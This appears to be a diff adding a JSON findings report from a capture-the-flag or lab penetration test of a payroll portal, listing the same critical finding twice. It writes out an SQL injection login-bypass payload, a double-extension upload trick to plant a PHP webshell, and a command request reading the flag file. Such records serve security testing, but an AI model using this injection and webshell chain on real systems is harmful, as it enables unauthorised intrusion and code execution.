@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T11:57:04.722990+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "7350e635-b561-4543-bd61-bdee404752e8",
+      "timestamp": "2026-04-15T11:57:04.722871+00:00",
+      "title": "Boolean-based Blind SQLi leading to RCE via File Upload Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53079",
+      "description": "The PayBuddies HR payroll portal is vulnerable to Boolean-based Blind SQL Injection in the login form. The password field accepts injection payload `'))) OR 1=1-- -` which bypasses authentication. After login, the file upload feature only checks client-side and server-side file extensions, allowing double-extension bypass (shell.pdf.php) to upload a PHP webshell. This leads to remote code execution and flag extraction.",
+      "evidence": "flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /index.php with username=admin&password='))) OR 1=1-- -' to bypass login, then POST /upload.php with file shell.pdf.php containing PHP webshell, then GET /uploaded_invoices/shell.pdf.php?cmd=cat%20/FLAG.txt",
+        "expected": "flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}"
+      }
+    },
+    {
+      "id": "b74ab8c7-9029-4d03-b92c-5b927fbffc50",
+      "timestamp": "2026-04-15T11:57:04.771685+00:00",
+      "title": "Boolean-based Blind SQLi leading to RCE via File Upload Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53079",
+      "description": "The PayBuddies HR payroll portal is vulnerable to Boolean-based Blind SQL Injection in the login form. The password field accepts injection payload `'))) OR 1=1-- -` which bypasses authentication. After login, the file upload feature only checks client-side and server-side file extensions, allowing double-extension bypass (shell.pdf.php) to upload a PHP webshell. This leads to remote code execution and flag extraction.",
+      "evidence": "flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /index.php with username=admin&password='))) OR 1=1-- -' to bypass login, then POST /upload.php with file shell.pdf.php containing PHP webshell, then GET /uploaded_invoices/shell.pdf.php?cmd=cat%20/FLAG.txt",
+        "expected": "flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}"
+      }
+    }
+  ],
+  "diagrams": []
+}
